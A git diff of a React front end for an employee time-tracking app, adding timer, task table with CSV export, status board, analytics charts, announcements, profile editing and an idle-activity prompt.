+                {H>0&&<><div><div className={`timer-digits ${activeTimer.isPaused?'paused':''}`}>{String(H).padStart(2,'0')}</div><div style={{fontSize:10,color:'rgba(255,255,255,.4)',letterSpacing:'.1em',fontWeight:800,textTransform:'uppercase'}}>hrs</div></div><div className="timer-sep">:</div></>}
+                <div><div className={`timer-digits ${activeTimer.isPaused?'paused':''}`}>{String(M).padStart(2,'0')}</div><div style={{fontSize:10,color:'rgba(255,255,255,.4)',letterSpacing:'.1em',fontWeight:800,textTransform:'uppercase'}}>min</div></div>
+                <div className="timer-sep">:</div>
+                <div><div className={`timer-digits ${activeTimer.isPaused?'paused':''}`} style={{color:S%2===0&&!activeTimer.isPaused?'#fff':'rgba(255,255,255,.5)',transition:'color .5s'}}>{String(S).padStart(2,'0')}</div><div style={{fontSize:10,color:'rgba(255,255,255,.4)',letterSpacing:'.1em',fontWeight:800,textTransform:'uppercase'}}>sec</div></div>
+              </div>
+              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:12}}>
+                <div style={{width:7,height:7,background:activeTimer.isPaused?'#fbbf24':'#4ade80',borderRadius:'50%',animation:activeTimer.isPaused?'none':'pulse 1.3s ease infinite'}}/>
+                <span style={{fontSize:11,color:'rgba(255,255,255,.45)',fontWeight:600}}>{activeTimer.isPaused?'Paused':`Started ${fmt12(activeTimer.startStr)}`}</span>
+              </div>
+              <div className="timer-bar-wrap"><div className={`timer-bar ${activeTimer.isPaused?'paused':''}`} style={{width:`${Math.min(100,(elapsed/3600)%1*100)}%`}}/></div>
+              <div className="timer-actions">
+                <button className="pause-btn" onClick={togglePause}>{activeTimer.isPaused?'▶ Resume':'⏸ Pause'}</button>
+                <button className="stop-btn" onClick={stopTimer}><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><rect x="4" y="4" width="16" height="16" rx="2"/></svg>Stop & Save</button>
+              </div>
+            </div>
+          ):(
+            <div className="track-card card">
+              <div className="track-title">⏱ Start Tracking</div>
+              <div className="track-sub">Select a task or enter a custom one</div>
+              <div style={{display:'flex',gap:10,marginBottom:12,flexWrap:'wrap'}}>
+                <select className="track-select" style={{flex:1}} value={selTask} onChange={e=>setSelTask(e.target.value)}>
+                  <option value="">— Select preset task —</option>
+                  {PRESET_TASKS.map(t=><option key={t} value={t}>{t}</option>)}
+                </select>
+                {selTask==='Other'&&<input className="input" style={{flex:1,minWidth:150}} placeholder="Specify task…" value={otherTask} onChange={e=>setOtherTask(e.target.value)} onKeyDown={e=>e.key==='Enter'&&otherTask&&startTimer(otherTask)}/>}
+                <button className="btn btn-p" onClick={()=>{const n=selTask==='Other'?otherTask:selTask;if(n)startTimer(n);}}>
+                  <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>Start
+                </button>
+              </div>
+              <div style={{marginBottom:8,fontSize:11,fontWeight:700,color:'var(--tx3)',textTransform:'uppercase',letterSpacing:'.07em'}}>Or enter a custom task</div>
+              <div style={{display:'flex',gap:10}}>
+                <input className="input" style={{flex:1}} placeholder="Custom task name…" value={customTask} onChange={e=>setCustomTask(e.target.value)} onKeyDown={e=>{if(e.key==='Enter'&&customTask){startTimer(customTask);setCustomTask('');}}}/>
+                <button className="btn btn-p" onClick={()=>{if(customTask){startTimer(customTask);setCustomTask('');}}} style={{whiteSpace:'nowrap'}}>▶ Start</button>
+              </div>
+            </div>
+          )}
+        </div>
+        <WeatherWidget/>
+      </div>
+      <div className="recent-wrap card">
+        <div className="recent-hdr">
+          <span className="recent-title">📝 Today's Tasks ({todayTasks.length})</span>
+          <div style={{display:'flex',alignItems:'center',gap:10,flex:1,justifyContent:'flex-end',flexWrap:'wrap'}}>
+            <input type="text" className="search-input" placeholder="🔍 Search…" value={taskSearch} onChange={e=>setTaskSearch(e.target.value)}/>
+            <span style={{fontSize:11.5,color:'var(--tx3)',fontWeight:600,whiteSpace:'nowrap'}}>{filteredTasks.length} shown</span>
+          </div>
+        </div>
+        {filteredTasks.length===0?(
+          <div style={{textAlign:'center',padding:'44px 20px',color:'var(--tx3)'}}>
+            <div style={{fontSize:36,marginBottom:12,opacity:.4}}>📋</div>
+            <p style={{fontSize:13.5,fontWeight:600}}>{taskSearch?'No matching tasks found':'No tasks logged today yet'}</p>
+            <p style={{fontSize:12,marginTop:5,opacity:.7}}>{taskSearch?'Try a different search term':'Start a timer above to track your work'}</p>
+          </div>
+        ):filteredTasks.map((t,i)=>(
+          <div key={t.id||i} className="task-row">
+            <div style={{display:'flex',alignItems:'center',flex:1}}>
+              <div className="task-dot" style={{background:getCatColor(t.taskName)}}/>
+              <div><div className="task-name">{t.taskName}</div><div className="task-time">{fmt12(strip(t.startTime))} → {fmt12(strip(t.endTime))}</div></div>
+            </div>
+            <div className="dur-badge">{fmtMins(Number(t.durationMinutes)||0)}</div>
           </div>
         ))}
       </div>
@@ -481,71 +1011,381 @@ const Settings = ({ theme, setTheme }) => {
   );
 };
 
-// ---------------------------------------------
-// Main App Orchestrator
-// ---------------------------------------------
-const App = () => {
-  const [user, setUser] = useState(null);
-  const [view, setView] = useState('dash');
-  const [theme, setTheme] = useState('gigahertz'); // Default to the newly fixed gigahertz
-  const [tasks, setTasks] = useState([]);
-
-  useEffect(() => { document.documentElement.setAttribute('data-theme', theme); }, [theme]);
-
-  if (!user) return <AuthPage onLogin={setUser} />;
-
-  return (
-    <div className="layout glass">
-      {/* Desktop Sidebar */}
-      <aside className="sidebar glass">
-        <div style={{padding:'30px 24px', display:'flex', alignItems:'center', gap:14, borderBottom:'1px solid var(--glass-border)'}}>
-          <div style={{width:44, height:44, borderRadius:14, background:'#fff', padding:4, boxShadow:'inset 0 2px 4px rgba(0,0,0,0.1)'}}>
-            <img src="https://contents.smsupermalls.com/data/uploads/2020/07/GIGAHERTZ_COMPUTER_SYSTEM.jpg" alt="Logo" style={{width:'100%', height:'100%', objectFit:'contain'}}/>
-          </div>
-          <div>
-            <div style={{fontWeight:900, fontSize:18, color:'var(--tx)'}}>Gigahertz</div>
-            <div style={{fontSize:10, fontWeight:800, color:'var(--p)', letterSpacing:'1px', textTransform:'uppercase'}}>Nexus Core</div>
-          </div>
+// TASKS PAGE
+const TasksPage=({user,tasks,onTasksChanged,pushNotif})=>{
+  const[fd,setFd]=useState('');
+  const filtered=useMemo(()=>tasks.filter(t=>!fd||strip(t.date)===fd),[tasks,fd]);
+  const totalMins=useMemo(()=>filtered.reduce((s,t)=>s+Number(t.durationMinutes||0),0),[filtered]);
+  const handleRemark=async(id,val)=>{const res=await api.updateTaskRemark({taskId:id,remarks:val});if(res.success)onTasksChanged();};
+  const doExport=()=>{exportCSV(['Task','Date','Start','End','Duration (min)','Remarks'],filtered.map(t=>[t.taskName,strip(t.date),strip(t.startTime),strip(t.endTime),t.durationMinutes,t.remarks||'']),'tasks_export.csv');pushNotif('Exported to CSV','success');};
+  return(
+    <div className="page anim-fade">
+      <div className="page-hdr"><div className="page-title">Task Management</div><div className="page-sub">Your complete time entry history</div></div>
+      <div style={{display:'flex',alignItems:'center',gap:12,marginBottom:20,flexWrap:'wrap'}}>
+        <div style={{display:'inline-flex',alignItems:'center',gap:7,background:'var(--ps)',color:'var(--p)',padding:'8px 16px',borderRadius:99,fontSize:13.5,fontWeight:800}}><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Total: {fmtMins(totalMins)}</div>
+        <div style={{display:'flex',alignItems:'center',gap:8,background:'var(--gb2)',padding:'8px 14px',borderRadius:var_('--rsm','10px'),border:'1px solid var(--bd)',borderRadius:10}}>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--tx3)" strokeWidth="2.5"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+          <input type="date" value={fd} onChange={e=>setFd(e.target.value)} style={{border:'none',outline:'none',fontSize:13.5,color:'var(--tx)',background:'transparent',fontFamily:'inherit',fontWeight:700}}/>
+          {fd&&<button onClick={()=>setFd('')} style={{background:'none',border:'none',cursor:'pointer',color:'var(--tx3)',fontSize:16,fontWeight:900}}>×</button>}
         </div>
-        
-        <nav style={{flex:1, marginTop:24}}>
-          <div className={`nav-item ${view==='dash'?'active':''}`} onClick={()=>setView('dash')}>
-            <span className="nav-icon"><i className="fa-solid fa-chart-pie"></i></span> Dashboard
-          </div>
-          <div className={`nav-item ${view==='settings'?'active':''}`} onClick={()=>setView('settings')}>
-            <span className="nav-icon"><i className="fa-solid fa-palette"></i></span> Themes
-          </div>
-        </nav>
-        
-        <div style={{padding:'24px', borderTop:'1px solid var(--glass-border)'}}>
-          <div className="nav-item" onClick={()=>setUser(null)} style={{color:'#ef4444', background:'rgba(239,68,68,0.1)', margin:0}}>
-            <span className="nav-icon" style={{background:'transparent'}}><i className="fa-solid fa-power-off"></i></span> Logout
-          </div>
+        <button className="btn btn-ghost btn-sm" onClick={doExport}>📥 Export CSV</button>
+      </div>
+      <div className="card" style={{borderRadius:16,overflow:'hidden'}}>
+        <div className="table-wrap">
+          {filtered.length===0?(
+            <div style={{textAlign:'center',padding:'60px 20px',color:'var(--tx3)'}}>
+              <div style={{fontSize:40,marginBottom:12,opacity:.35}}>📄</div>
+              <p style={{fontSize:14,fontWeight:600}}>No tasks found for this selection</p>
+            </div>
+          ):(
+            <table className="gh-table">
+              <thead><tr><th>Task Name</th><th>Date</th><th>Start</th><th>End</th><th>Duration</th><th>Remarks</th></tr></thead>
+              <tbody>{filtered.map((t,i)=>(
+                <tr key={t.id||i}>
+                  <td style={{fontWeight:700}}><div style={{display:'flex',alignItems:'center',gap:10}}><div className="task-dot" style={{background:getCatColor(t.taskName),width:8,height:8,borderRadius:'50%',flexShrink:0}}/>{t.taskName}</div></td>
+                  <td>{fmtDate(strip(t.date))}</td>
+                  <td>{fmt12(strip(t.startTime))}</td>
+                  <td>{fmt12(strip(t.endTime))}</td>
+                  <td><span className="dur-badge">{fmtMins(Number(t.durationMinutes)||0)}</span></td>
+                  <td style={{width:'22%'}}><input type="text" defaultValue={strip(t.remarks)||''} placeholder="Add remark…" onBlur={e=>{if(e.target.value!==(strip(t.remarks)||''))handleRemark(t.id,e.target.value);}} style={{background:'transparent',border:'none',outline:'none',color:'var(--tx)',fontSize:13,width:'100%',borderBottom:'1px dashed transparent',padding:'3px 0',transition:'.2s'}} onFocus={e=>e.target.style.borderBottom='1px dashed var(--p)'} onBlurCapture={e=>e.target.style.borderBottom='1px dashed transparent'}/></td>
+                </tr>
+              ))}</tbody>
+            </table>
+          )}
         </div>
-      </aside>
-
-      {/* Main Content Area */}
-      <main className="main">
-        {view === 'dash' && <Dashboard user={user} tasks={tasks} setTasks={setTasks} />}
-        {view === 'settings' && <Settings theme={theme} setTheme={setTheme} />}
-      </main>
-
-      {/* Mobile Nav (Aero Glass Style) */}
-      <nav className="mobile-nav glass">
-        <div className={`mob-nav-btn ${view==='dash'?'active':''}`} onClick={()=>setView('dash')}>
-          <span className="mob-icon"><i className="fa-solid fa-chart-pie"></i></span> Home
-        </div>
-        <div className={`mob-nav-btn ${view==='settings'?'active':''}`} onClick={()=>setView('settings')}>
-          <span className="mob-icon"><i className="fa-solid fa-palette"></i></span> Themes
-        </div>
-        <div className="mob-nav-btn" onClick={()=>setUser(null)} style={{color:'#ef4444'}}>
-          <span className="mob-icon" style={{background:'rgba(239,68,68,0.1)'}}><i className="fa-solid fa-power-off"></i></span> Logout
-        </div>
-      </nav>
+      </div>
     </div>
   );
 };
 
+// STATUS BOARD PAGE
+const StatusPage=({user})=>{
+  const[users,setUsers]=useState([]);
+  const[loading,setLoading]=useState(true);
+  const[filter,setFilter]=useState('');
+  useEffect(()=>{
+    api.getActiveStatus().then(res=>{
+      setUsers(res?.users||[]);setLoading(false);
+    });
+  },[]);
+  const filtered=useMemo(()=>users.filter(u=>{
+    // THE ROSE RULE: never show Rose's name unless viewer IS Rose
+    const displayName=safeShowName(u.name,user);
+    if(!displayName)return false;
+    if(!filter.trim())return true;
+    return (displayName||'').toLowerCase().includes(filter.toLowerCase())||(u.dept||'').toLowerCase().includes(filter.toLowerCase());
+  }),[users,filter,user]);
+  return(
+    <div className="page anim-fade">
+      <div className="page-hdr">
+        <div className="page-title">Active Status Board</div>
+        <div className="page-sub" style={{display:'flex',alignItems:'center',gap:7}}><div className="live-dot"/>{loading?'Loading…':`${filtered.length} personnel currently active`}</div>
+      </div>
+      <div style={{display:'flex',gap:12,marginBottom:18,flexWrap:'wrap'}}>
+        <input className="input" style={{maxWidth:300}} placeholder="🔍 Search by name or department…" value={filter} onChange={e=>setFilter(e.target.value)}/>
+        <button className="btn btn-ghost btn-sm" onClick={()=>{setLoading(true);api.getActiveStatus().then(r=>{setUsers(r?.users||[]);setLoading(false);});}}>↻ Refresh</button>
+      </div>
+      {loading?(
+        <div style={{textAlign:'center',padding:'60px',color:'var(--tx3)'}}><div className="spinner-p" style={{margin:'0 auto 14px',width:28,height:28,borderWidth:3}}/><p style={{fontSize:13.5,fontWeight:600}}>Loading status board…</p></div>
+      ):filtered.length===0?(
+        <div style={{textAlign:'center',padding:'60px',color:'var(--tx3)'}}><div style={{fontSize:44,marginBottom:12,opacity:.35}}>📡</div><p style={{fontSize:14,fontWeight:600}}>No active personnel found</p></div>
+      ):(
+        <div style={{display:'grid',gridTemplateColumns:'repeat(auto-fill,minmax(300px,1fr))',gap:12}}>
+          {filtered.map((u,i)=>{
+            const displayName=safeShowName(u.name,user)||'[Employee]';
+            return(
+              <div key={i} className="status-row">
+                <div className="status-avatar">{u.photo?<img src={u.photo} alt="av"/>:(displayName[0]||'?').toUpperCase()}</div>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{fontSize:13.5,fontWeight:800,color:'var(--tx)',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{displayName}</div>
+                  <div style={{fontSize:11.5,color:'var(--tx3)',fontWeight:500}}>{u.dept||'—'}{u.clockIn?` · Since ${u.clockIn}`:''}</div>
+                </div>
+                <span className="badge badge-active">Active</span>
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+};
+
+// ANALYTICS PAGE
+const AnalyticsPage=({user,tasks})=>{
+  const barRef=useRef(null),donutRef=useRef(null);
+  const barC=useRef(null),donutC=useRef(null);
+  const[sd,setSd]=useState(()=>{const d=new Date();d.setDate(d.getDate()-6);return d.toISOString().split('T')[0];});
+  const[ed,setEd]=useState(()=>todayStr());
+  const filtered=useMemo(()=>tasks.filter(t=>strip(t.date)>=sd&&strip(t.date)<=ed),[tasks,sd,ed]);
+  useEffect(()=>{
+    const days=[];let cur=new Date(sd);const end=new Date(ed);
+    while(cur<=end&&days.length<366){const ds=cur.toISOString().split('T')[0];const mins=filtered.filter(t=>strip(t.date)===ds).reduce((s,t)=>s+Number(t.durationMinutes||0),0);days.push({label:cur.toLocaleDateString('en-US',{month:'short',day:'numeric'}),hours:mins/60});cur.setDate(cur.getDate()+1);}
+    const cats={};filtered.forEach(t=>{const k=t.taskName||'Other';if(!cats[k])cats[k]=0;cats[k]+=Number(t.durationMinutes||0)/60;});
+    const topCats=Object.entries(cats).sort((a,b)=>b[1]-a[1]).slice(0,6);
+    const tc='rgba(136,144,170,.15)',lc='var(--tx2)';
+    if(barRef.current){barC.current?.destroy();barC.current=new Chart(barRef.current,{type:'line',data:{labels:days.map(d=>d.label),datasets:[{data:days.map(d=>d.hours),fill:true,backgroundColor:'rgba(26,86,219,.1)',borderColor:'var(--p)',borderWidth:2.5,tension:.4,pointRadius:days.length>20?0:4}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{y:{grid:{color:tc},ticks:{callback:v=>`${v}h`,color:lc}},x:{grid:{display:false},ticks:{color:lc,maxTicksLimit:14}}}}});}
+    if(donutRef.current&&topCats.length>0){donutC.current?.destroy();donutC.current=new Chart(donutRef.current,{type:'doughnut',data:{labels:topCats.map(c=>c[0]),datasets:[{data:topCats.map(c=>c[1]),backgroundColor:['#1a56db','#8b5cf6','#10b981','#f59e0b','#ef4444','#06b6d4'],borderWidth:2,borderColor:'var(--gb2)'}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{position:'bottom',labels:{color:lc,font:{family:'Plus Jakarta Sans',size:11,weight:'600'}}}},cutout:'70%'}});}
+    return()=>{barC.current?.destroy();donutC.current?.destroy();};
+  },[filtered,sd,ed]);
+  const totalMins=filtered.reduce((s,t)=>s+Number(t.durationMinutes||0),0);
+  const avgDay=filtered.length>0?totalMins/Math.max(1,Math.ceil((new Date(ed)-new Date(sd))/86400000)+1):0;
+  const handleExport=()=>exportCSV(['Task','Date','Start','End','Minutes'],filtered.map(t=>[t.taskName,strip(t.date),strip(t.startTime),strip(t.endTime),t.durationMinutes]),'analytics_export.csv');
+  return(
+    <div className="page anim-fade">
+      <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-end',flexWrap:'wrap',gap:12,marginBottom:22}}>
+        <div><div className="page-title">Analytics</div><div className="page-sub">Productivity insights and time distribution</div></div>
+        <div style={{display:'flex',gap:10,alignItems:'center',flexWrap:'wrap'}}>
+          <div style={{display:'flex',alignItems:'center',gap:8,background:'var(--gb2)',padding:'8px 14px',borderRadius:10,border:'1px solid var(--bd)'}}>
+            <input type="date" value={sd} onChange={e=>setSd(e.target.value)} style={{border:'none',outline:'none',fontSize:13,color:'var(--tx)',background:'transparent',fontFamily:'inherit',fontWeight:700}}/>
+            <span style={{color:'var(--tx3)',fontSize:13,fontWeight:600}}>to</span>
+            <input type="date" value={ed} onChange={e=>setEd(e.target.value)} style={{border:'none',outline:'none',fontSize:13,color:'var(--tx)',background:'transparent',fontFamily:'inherit',fontWeight:700}}/>
+          </div>
+          <button className="btn btn-ghost btn-sm" onClick={handleExport}>📥 Export</button>
+        </div>
+      </div>
+      <div style={{display:'grid',gridTemplateColumns:'repeat(auto-fit,minmax(150px,1fr))',gap:14,marginBottom:22}}>
+        {[{l:'Total Hours',v:(totalMins/60).toFixed(1)+'h',c:'var(--p)'},{l:'Total Tasks',v:filtered.length,c:'#8b5cf6'},{l:'Avg / Day',v:fmtMins(Math.round(avgDay)),c:'#10b981'}].map(s=>(
+          <div key={s.l} className="stat-card card" style={{padding:'18px 20px'}}>
+            <div className="stat-lbl">{s.l}</div>
+            <div className="stat-val" style={{color:s.c,fontSize:24}}>{s.v}</div>
+          </div>
+        ))}
+      </div>
+      <div className="dash-grid">
+        <div className="card" style={{padding:'22px 24px'}}>
+          <div className="section-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>Hours Per Day</div>
+          <div className="chart-wrap"><canvas ref={barRef}/></div>
+        </div>
+        <div className="card" style={{padding:'22px 24px'}}>
+          <div className="section-title">📊 Task Breakdown</div>
+          <div className="chart-wrap"><canvas ref={donutRef}/></div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// ANNOUNCEMENTS PAGE
+const AnnouncementsPage=({user})=>{
+  const announcements=[
+    {id:1,title:'Q2 Kickoff Meeting',body:'All department heads please attend the Q2 kickoff meeting on April 10, 2026 at 9:00 AM. Attendance is mandatory.',author:'Nexus Admin',date:'2026-04-05',priority:'high',pinned:true},
+    {id:2,title:'System Maintenance Window',body:'Nexus Tracker will undergo scheduled maintenance on April 7, 2026 from 11:00 PM to 1:00 AM. Please save all work.',author:'Nexus Admin',date:'2026-04-03',priority:'low',pinned:false},
+    {id:3,title:'New Leave Policy',body:'Updated leave filing procedures are now in effect. All requests must be submitted at least 3 working days in advance via the system.',author:'HR Department',date:'2026-03-28',priority:'medium',pinned:false},
+  ];
+  const priorityColor={high:'var(--danger)',medium:'var(--warn)',low:'var(--ok)'};
+  const priorityLabel={high:'🔴 Urgent',medium:'🟡 Medium',low:'🟢 Info'};
+  const sorted=[...announcements].sort((a,b)=>{if(a.pinned&&!b.pinned)return -1;if(!a.pinned&&b.pinned)return 1;return new Date(b.date)-new Date(a.date);});
+  return(
+    <div className="page anim-fade">
+      <div className="page-hdr"><div className="page-title">📢 Announcements</div><div className="page-sub">{announcements.length} total broadcasted</div></div>
+      <div className="announcements-list">
+        {sorted.map(ann=>(
+          <div key={ann.id} className={`ann-card card ann-priority-${ann.priority}`}>
+            <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap',marginBottom:10}}>
+              {ann.pinned&&<span style={{fontSize:11,fontWeight:900,color:'var(--p)'}}>📌 PINNED</span>}
+              <span style={{fontSize:11,fontWeight:800,color:priorityColor[ann.priority]}}>{priorityLabel[ann.priority]}</span>
+              <span style={{fontSize:11,color:'var(--tx3)',fontWeight:600,marginLeft:'auto'}}>{fmtDate(ann.date)}</span>
+            </div>
+            <div className="ann-title">{ann.title}</div>
+            <div className="ann-body">{ann.body}</div>
+            <div className="ann-meta">— {ann.author}</div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+};
+
+// PROFILE PAGE
+const ProfilePage=({user,tasks,onUpdateUser,pushNotif})=>{
+  const fileRef=useRef(null);
+  const[editing,setEditing]=useState(false);
+  const[form,setForm]=useState({firstName:user?.firstName||'',lastName:user?.lastName||'',email:user?.email||''});
+  const[bio,setBio]=useState(user?.bio||'');
+  const[loading,setLoading]=useState(false);
+  const totalMins=tasks.reduce((s,t)=>s+Number(t.durationMinutes||0),0);
+  const totalHours=(totalMins/60).toFixed(1);
+  const uniqueDays=[...new Set(tasks.map(t=>strip(t.date)))].length;
+  const handlePhoto=e=>{
+    const file=e.target.files[0];if(!file)return;
+    const reader=new FileReader();
+    reader.onload=async ev=>{
+      setLoading(true);
+      const b64=ev.target.result;
+      const res=await api.updatePhoto({userId:user.id,photoBase64:b64});
+      setLoading(false);
+      if(res.success){onUpdateUser({...user,photo:b64});pushNotif('Profile photo updated!','success');}
+      else pushNotif(res.error||'Failed to update photo','error');
+    };
+    reader.readAsDataURL(file);
+  };
+  const saveProfile=async()=>{
+    setLoading(true);
+    const res=await api.updateBio({userId:user.id,empId:user.empId,firstName:form.firstName,lastName:form.lastName,email:form.email,bio});
+    setLoading(false);
+    if(res.success){onUpdateUser({...user,...form,bio});pushNotif('Profile saved!','success');setEditing(false);}
+    else pushNotif(res.error||'Save failed','error');
+  };
+  const defaultAvatar="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%236b7eb8'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/%3E%3C/svg%3E";
+  return(
+    <div className="page anim-fade">
+      <div className="page-hdr"><div className="page-title">My Profile</div><div className="page-sub">Manage your account and view your stats</div></div>
+      <div style={{display:'grid',gridTemplateColumns:'300px 1fr',gap:22,alignItems:'start'}}>
+        <div className="card" style={{padding:'32px 24px',textAlign:'center'}}>
+          <div className="profile-avatar-wrap">
+            <img src={user?.photo||defaultAvatar} className="profile-avatar" alt="Profile"/>
+            {loading?<div className="profile-avatar-btn" style={{cursor:'wait'}}><div className="spinner" style={{width:16,height:16,borderWidth:2}}/></div>:<button className="profile-avatar-btn" onClick={()=>fileRef.current?.click()}>📷</button>}
+            <input type="file" accept="image/*" ref={fileRef} style={{display:'none'}} onChange={handlePhoto} disabled={loading}/>
+          </div>
+          <div style={{fontSize:20,fontWeight:900,color:'var(--tx)',marginBottom:5}}>{user?.firstName} {user?.lastName}</div>
+          <div style={{fontSize:12.5,color:'var(--tx3)',marginBottom:14,fontWeight:500,fontFamily:'monospace'}}>{user?.empId||'GHZ-0000'}</div>
+          <div style={{display:'flex',justifyContent:'center',gap:8,flexWrap:'wrap'}}>
+            <span className={`badge ${user?.role==='Admin'?'badge-admin':'badge-active'}`}>{user?.role||'Staff'}</span>
+            {user?.dept&&<span className="badge" style={{background:'var(--pa)',color:'var(--p)',border:'1px solid var(--bd2)'}}>{user.dept}</span>}
+          </div>
+          {user?.bio&&<div style={{marginTop:14,fontSize:12.5,color:'var(--tx3)',fontStyle:'italic',lineHeight:1.6}}>{user.bio}</div>}
+        </div>
+        <div style={{display:'flex',flexDirection:'column',gap:18}}>
+          <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:14}}>
+            {[{l:'Total Tasks',v:tasks.length,i:'📋'},{l:'Total Hours',v:totalHours+'h',i:'⏱️'},{l:'Active Days',v:uniqueDays,i:'📅'},{l:'Avg / Day',v:uniqueDays?(totalHours/uniqueDays).toFixed(1)+'h':'0h',i:'📈'}].map(s=>(
+              <div key={s.l} className="stat-card card" style={{padding:'18px 20px'}}>
+                <div style={{fontSize:22,marginBottom:10}}>{s.i}</div>
+                <div className="stat-lbl">{s.l}</div>
+                <div className="stat-val" style={{fontSize:26}}>{s.v}</div>
+              </div>
+            ))}
+          </div>
+          <div className="card" style={{padding:'22px 24px'}}>
+            <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:18}}>
+              <div style={{fontSize:15,fontWeight:800,color:'var(--tx)'}}>Profile Information</div>
+              {!editing&&<button className="btn btn-ghost btn-sm" onClick={()=>setEditing(true)}>✏️ Edit</button>}
+            </div>
+            {editing?(
+              <div style={{display:'flex',flexDirection:'column',gap:14}}>
+                <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12}}>
+                  <div><label className="input-label">First Name</label><input className="input" value={form.firstName} onChange={e=>setForm(p=>({...p,firstName:e.target.value}))}/></div>
+                  <div><label className="input-label">Last Name</label><input className="input" value={form.lastName} onChange={e=>setForm(p=>({...p,lastName:e.target.value}))}/></div>
+                </div>
+                <div><label className="input-label">Email</label><input className="input" type="email" value={form.email} onChange={e=>setForm(p=>({...p,email:e.target.value}))}/></div>
+                <div><label className="input-label">Bio</label><textarea className="input" rows={3} value={bio} onChange={e=>setBio(e.target.value)} style={{resize:'vertical'}} placeholder="A short description about yourself…"/></div>
+                <div style={{display:'flex',gap:10}}>
+                  <button className="btn btn-p" onClick={saveProfile} disabled={loading}>{loading?<span className="spinner"/>:'💾 Save Changes'}</button>
+                  <button className="btn btn-ghost" onClick={()=>setEditing(false)}>Cancel</button>
+                </div>
+              </div>
+            ):(
+              <div style={{display:'flex',flexDirection:'column',gap:11}}>
+                {[['Employee ID',user?.empId||'—'],['First Name',user?.firstName||'—'],['Last Name',user?.lastName||'—'],['Email',user?.email||'—'],['Department',user?.dept||'—'],['Role',user?.role||'Staff']].map(([k,v])=>(
+                  <div key={k} style={{display:'flex',borderBottom:'1px solid var(--bd)',paddingBottom:11}}>
+                    <span style={{fontSize:12,fontWeight:700,color:'var(--tx3)',width:130,flexShrink:0,textTransform:'uppercase',letterSpacing:'.06em'}}>{k}</span>
+                    <span style={{fontSize:13.5,fontWeight:600,color:'var(--tx)'}}>{v}</span>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// IDLE WATCHER
+const IdleWatcher=({onIdleOut})=>{
+  const[idleSecs,setIdleSecs]=useState(0);
+  const[show,setShow]=useState(false);
+  const[popSecs,setPopSecs]=useState(0);
+  const lastAct=useRef(Date.now());
+  const reset=useCallback(()=>{lastAct.current=Date.now();if(!show)setIdleSecs(0);},[show]);
+  useEffect(()=>{const evts=['mousemove','mousedown','keydown','touchstart','click','scroll'];evts.forEach(e=>window.addEventListener(e,reset,{passive:true}));return()=>evts.forEach(e=>window.removeEventListener(e,reset));},[reset]);
+  useEffect(()=>{const t=setInterval(()=>{const s=Math.floor((Date.now()-lastAct.current)/1000);setIdleSecs(s);if(s>=1800&&!show){setShow(true);setPopSecs(0);}},1000);return()=>clearInterval(t);},[show]);
+  useEffect(()=>{if(!show)return;const t=setInterval(()=>setPopSecs(p=>{if(p+1>=120){setShow(false);onIdleOut&&onIdleOut(idleSecs);return 0;}return p+1;}),1000);return()=>clearInterval(t);},[show,idleSecs]);
+  const here=()=>{setShow(false);setIdleSecs(0);lastAct.current=Date.now();};
+  const out=()=>{setShow(false);setIdleSecs(0);lastAct.current=Date.now();onIdleOut&&onIdleOut(idleSecs);};
+  if(!show)return null;
+  const pct=Math.min(100,(popSecs/120)*100);
+  const mm=String(Math.floor(idleSecs/60)).padStart(2,'0'),ss=String(idleSecs%60).padStart(2,'0');
+  return(
+    <div className="idle-overlay">
+      <div className="idle-card">
+        <div className="idle-icon">⏰</div>
+        <div className="idle-title">Still there?</div>
+        <div className="idle-msg">No activity for <strong>{Math.round(idleSecs/60)} minutes</strong>.<br/>Your session is still running.</div>
+        <div className="idle-time">{mm}:{ss}</div>
+        <div className="idle-btns">
+          <button className="btn btn-p" style={{flex:1,padding:'13px'}} onClick={here}>👋 I'm here</button>
+          <button style={{flex:1,padding:'13px',background:'var(--pa)',border:'1px solid var(--bd2)',borderRadius:'var(--rsm)',fontSize:13,fontWeight:700,cursor:'pointer',color:'var(--tx2)',transition:'.2s',lineHeight:1.4}} onClick={out}>🚶 Stepped away</button>
+        </div>
+        <div className="idle-prog"><div className="idle-prog-fill" style={{width:`${pct}%`,background:pct>70?'var(--danger)':'var(--warn)'}}/></div>
+        <p style={{fontSize:10.5,color:'var(--tx3)',marginTop:9,fontWeight:600}}>Auto-dismissing in {120-popSecs}s</p>
+      </div>
+    </div>
+  );
+};
+
+// MAIN APP
+const App=()=>{
